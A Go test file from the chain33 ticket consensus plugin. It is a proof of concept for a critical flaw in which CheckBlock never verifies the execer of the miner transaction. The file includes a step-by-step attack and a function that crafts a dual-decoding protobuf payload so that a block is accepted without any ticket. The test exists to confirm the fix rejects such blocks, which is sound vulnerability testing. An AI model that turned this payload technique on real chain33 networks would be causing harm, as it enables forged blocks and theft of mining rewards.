// Copyright Fuzamei Corp. All Rights Reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package ticket

import (
	"encoding/hex"
	"testing"

	"github.com/btcsuite/btcd/btcec/v2"

	"github.com/33cn/chain33/common/address"
	"github.com/33cn/chain33/common/difficulty"
	"github.com/33cn/chain33/common/merkle"
	vrf "github.com/33cn/chain33/common/vrf/secp256k1"
	"github.com/33cn/chain33/types"
	"github.com/33cn/chain33/util"
	"github.com/33cn/chain33/util/testnode"
	ty "github.com/33cn/plugin/plugin/dapp/ticket/types"
	"github.com/stretchr/testify/require"
	"google.golang.org/protobuf/encoding/protowire"

	_ "github.com/33cn/chain33/system"
	drivers "github.com/33cn/chain33/system/consensus"
	_ "github.com/33cn/plugin/plugin/dapp/init"
	_ "github.com/33cn/plugin/plugin/store/init"
)

// PoC for C-1 (critical): ticket consensus CheckBlock never verifies that
// tx[0].Execer is the ticket execer.
//
// CheckBlock only requires that tx[0]'s payload *decodes* as a
// TicketActionMiner (getMinerTx) and that Receipts[0].Ty == ExecOk. The exec
// layer, though, routes a transaction by tx.Execer. So an attacker can aim
// tx[0] at a different execer, never run ticket's Exec_Miner -- the action that
// actually proves ticket ownership, ticket status and frozen time -- and still
// get the ExecOk receipt that CheckBlock demands.
//
// Every remaining CheckBlock condition is attacker-computable:
//   - miner.Reward/Bits/Modify are self-declared, compared only against public
//     config or against the block header itself;
//   - the PoW is a hash over miner-chosen values checked against the chain's
//     powLimit;
//   - the VRF is verified against tx[0]'s own signing key, which the attacker
//     owns.
//
// Net effect: a block is accepted with no ticket at all.
//
// This test asserts such a block is REJECTED. On current master the block is
// ACCEPTED, so the final assertion FAILS -- that failure is the proof.
func TestC1_CheckBlockRejectsNonTicketMinerTx(t *testing.T) {
	mock33 := testnode.New("testdata/chain33.cfg.toml", nil)
	defer mock33.Close()
	cfg := mock33.GetClient().GetConfig()
	mock33.Listen()
	require.NoError(t, mock33.WaitHeightTimeout(20, 60))

	attacker := mock33.GetHotKey()
	attackerAddr := mock33.GetHotAddress()
	ticketExec := address.ExecAddress("ticket")
	reward := ty.GetTicketMinerParam(cfg, 100).CoinReward

	// Step 0: attacker locks a little coin into the ticket exec account with an
	// ordinary coins TransferToExec. This is the only prerequisite: it makes the
	// substituted coins action succeed, and that action pays it straight back.
	ety := types.LoadExecutorType("coins")
	deposit, err := ety.Create("TransferToExec", &types.AssetsTransferToExec{
		Amount: reward * 5, ExecName: "ticket", To: ticketExec,
	})
	require.NoError(t, err)
	dtx, err := types.FormatTx(cfg, "coins", deposit)
	require.NoError(t, err)
	dtx.To = ticketExec
	dtx.Sign(types.SECP256K1, attacker)
	reply, err := mock33.GetAPI().SendTx(dtx)
	require.NoError(t, err)
	_, err = mock33.WaitTx(reply.GetMsg())
	require.NoError(t, err)

	// freeze the chain so the tip we build on stays stable
	_, err = mock33.GetAPI().ExecWalletFunc("ticket", "WalletAutoMiner", &ty.MinerFlag{Flag: 0})
	require.NoError(t, err)
	mock33.Wait()
	for i := 0; i < 60; i++ {
		mock33.Wait()
	}
	parent := mock33.GetLastBlock()
	height := parent.Height + 1
	t.Logf("building on parent h=%d diff=%08x", parent.Height, parent.Difficulty)

	var parentAct ty.TicketAction
	require.NoError(t, types.Decode(parent.Txs[0].Payload, &parentAct))
	require.NotNil(t, parentAct.GetMiner())
	modify := parentAct.GetMiner().GetModify()
	require.NotEmpty(t, modify)

	// Step 1: satisfy the PoW and the VRF with attacker-chosen values.
	blocktime := types.Now().Unix()
	// NOTE: this ticket id names a ticket that does not exist. Nothing in
	// CheckBlock ever looks it up -- Exec_Miner is what would.
	ticketID := attackerAddr + ":0xdeadbeef:1:seed"
	rawPrivHash, err := genPrivHash(attacker, ticketID)
	require.NoError(t, err)
	require.NotEmpty(t, rawPrivHash)
	// privHash shares wire tag 5 with CoinsAction.Withdraw.to, which protobuf-go
	// decodes as a UTF-8 string, so it must be valid UTF-8. CheckBlock never
	// validates privHash against the ticket, so any encoding works.
	privHash := []byte(hex.EncodeToString(rawPrivHash))

	c := &Client{BaseClient: &drivers.BaseClient{}}
	c.SetAPI(mock33.GetAPI())
	currentdiff := c.getCurrentTarget(blocktime, ticketID, modify, privHash)
	require.LessOrEqual(t, currentdiff.Cmp(difficulty.CompactToBig(parent.Difficulty)), 0,
		"attacker-chosen (blocktime,ticketID,privHash) must beat the target")

	// VRF over the parent's vrfHash, signed with the attacker's own key.
	btcPriv, _ := btcec.PrivKeyFromBytes(attacker.Bytes())
	vpriv := &vrf.PrivateKey{PrivateKey: btcPriv.ToECDSA()}
	vrfHash, vrfProof := vpriv.Evaluate(parentAct.GetMiner().GetVrfHash())

	// Step 2: one payload that is BOTH a TicketActionMiner (what getMinerTx
	// inspects) and a CoinsAction.Withdraw (what actually executes).
	mkPayload := func(rw int64) []byte {
		return craftDualMinerWithdraw(parent.Difficulty, rw, ticketID, modify, privHash, vrfHash[:], vrfProof)
	}

	var decoded ty.TicketAction
	require.NoError(t, types.Decode(mkPayload(reward), &decoded))
	require.Equal(t, int32(ty.TicketActionMiner), decoded.GetTy(), "getMinerTx requires Ty==Miner")
	require.NotNil(t, decoded.GetMiner(), "getMinerTx requires Miner!=nil")
	require.Equal(t, vrfHash[:], decoded.GetMiner().GetVrfHash())

	// Step 3: run the real exec pipeline once to produce the BlockDetail, then
	// hand that detail to the consensus module's CheckBlock hook -- the exact
	// function under test.
	check := func(execer string, payload []byte) (*types.BlockDetail, error) {
		tx := &types.Transaction{
			Execer:  []byte(execer),
			Payload: payload,
			To:      ticketExec,
			Fee:     100000,
			Nonce:   11,
		}
		tx.Sign(types.SECP256K1, attacker)
		blk := &types.Block{
			Height:     height,
			ParentHash: parent.Hash(cfg),
			BlockTime:  blocktime,
			Difficulty: parent.Difficulty,
			Txs:        []*types.Transaction{tx},
		}
		blk.TxHash = merkle.CalcMerkleRoot(cfg, blk.Height, blk.Txs)
		detail, _, err := util.ExecBlock(mock33.GetClient(), parent.StateHash, blk, false, true, false)
		if err != nil {
			return nil, err
		}
		r0 := detail.Receipts[0]
		t.Logf("  tx[0].Execer=%q Receipts[0].Ty=%d (ExecOk=%d) logs=%d",
			detail.Block.Txs[0].Execer, r0.Ty, types.ExecOk, len(r0.Logs))
		return detail, util.CheckBlock(mock33.GetClient(), detail)
	}

	// --- Control: same block, but tx[0] carries the honest "ticket" execer and
	// names a ticket that does not exist. Exec_Miner therefore fails, the
	// receipt is not ExecOk, and CheckBlock must reject it at the receipt gate.
	// This proves the harness really reaches ticket's CheckBlock and that its
	// pre-existing receipt defence still works. (The reward rule cannot serve as
	// the control any more: it sits *behind* the receipt gate, which a block
	// with a non-ticket execer can no longer reach.)
	_, controlErr := check(ty.TicketX, mkPayload(reward))
	t.Logf("control (honest execer, nonexistent ticket) err=%v", controlErr)
	require.Error(t, controlErr, "control must be rejected, else CheckBlock is not being exercised")
	require.Contains(t, controlErr.Error(), types.ErrCoinBaseExecErr.Error(),
		"control must be rejected by CheckBlock's receipt gate")

	// --- The PoC: everything CheckBlock inspects is right, and the receipt is
	// a genuine ExecOk, but tx[0] is never executed by the ticket execer, so no
	// ticket ownership is proven anywhere. This MUST be rejected -- and before
	// the fix it was accepted, which is the vulnerability.
	detail, pocErr := check("coins", mkPayload(reward))
	require.NotNil(t, detail)
	require.Equal(t, int32(types.ExecOk), detail.Receipts[0].Ty,
		"CheckBlock's receipt gate requires Receipts[0].Ty==ExecOk")
	if pocErr == nil {
		t.Logf("VULNERABLE: CheckBlock accepted a block with tx[0].Execer=\"coins\"; " +
			"Exec_Miner never ran and no ticket was proven")
	} else {
		t.Logf("block rejected: %v", pocErr)
	}
	require.Error(t, pocErr,
		"CheckBlock accepted a block whose tx[0].Execer=%q never ran ticket's Exec_Miner; "+
			"the miner proved no ticket ownership", "coins")
	// Rejected specifically by the execer rule, not incidentally by something else.
	require.Equal(t, ty.ErrMinerTxExecer.Error(), pocErr.Error(),
		"the block must be rejected by the miner-execer rule itself")
}

// craftDualMinerWithdraw encodes ONE payload that decodes as both:
//
//	TicketAction{ Ty=16 (Miner), Miner != nil }     -- what getMinerTx inspects
//	CoinsAction{ Ty=3 (Withdraw), Withdraw != nil } -- what actually executes
//
// Shared top-level tags: 1 (topen/transfer), 3 (coins ty), 4 (miner/withdraw),
// 10 (ticket ty). Tag 4 is written last so it wins both oneofs. Inside tag 4,
// TicketMiner{bits,reward,ticketId,modify,privHash,vrfHash,vrfProof} overlaps
// AssetsWithdraw{cointoken,amount,note,execName,to}; the tail fields are simply
// unknown to coins.
func craftDualMinerWithdraw(bits uint32, reward int64, ticketID string, modify, privHash, vrfHash, vrfProof []byte) []byte {
	var sub []byte
	// miner.bits vs withdraw.cointoken (bytes): a varint here is an unknown
	// wire type for coins and is skipped.
	sub = protowire.AppendTag(sub, 1, protowire.VarintType)
	sub = protowire.AppendVarint(sub, uint64(bits))
	sub = protowire.AppendTag(sub, 2, protowire.VarintType) // miner.reward | withdraw.amount
	sub = protowire.AppendVarint(sub, uint64(reward))
	sub = protowire.AppendTag(sub, 3, protowire.BytesType) // miner.ticketId | withdraw.note
	sub = protowire.AppendString(sub, ticketID)
	sub = protowire.AppendTag(sub, 4, protowire.BytesType) // miner.modify | withdraw.execName
	sub = protowire.AppendBytes(sub, modify)
	sub = protowire.AppendTag(sub, 5, protowire.BytesType) // miner.privHash | withdraw.to
	sub = protowire.AppendBytes(sub, privHash)
	sub = protowire.AppendTag(sub, 6, protowire.BytesType) // miner.vrfHash  (unknown to coins)
	sub = protowire.AppendBytes(sub, vrfHash)
	sub = protowire.AppendTag(sub, 7, protowire.BytesType) // miner.vrfProof (unknown to coins)
	sub = protowire.AppendBytes(sub, vrfProof)

	var buf []byte
	buf = protowire.AppendTag(buf, 1, protowire.BytesType) // ticket.topen | coins.transfer
	buf = protowire.AppendBytes(buf, []byte{0x0a, 0x00})
	buf = protowire.AppendTag(buf, 3, protowire.VarintType) // coins.ty = Withdraw(3)
	buf = protowire.AppendVarint(buf, 3)
	buf = protowire.AppendTag(buf, 4, protowire.BytesType)
	buf = protowire.AppendBytes(buf, sub)
	buf = protowire.AppendTag(buf, 10, protowire.VarintType) // ticket.ty = Miner(16)
	buf = protowire.AppendVarint(buf, ty.TicketActionMiner)
	return buf
}
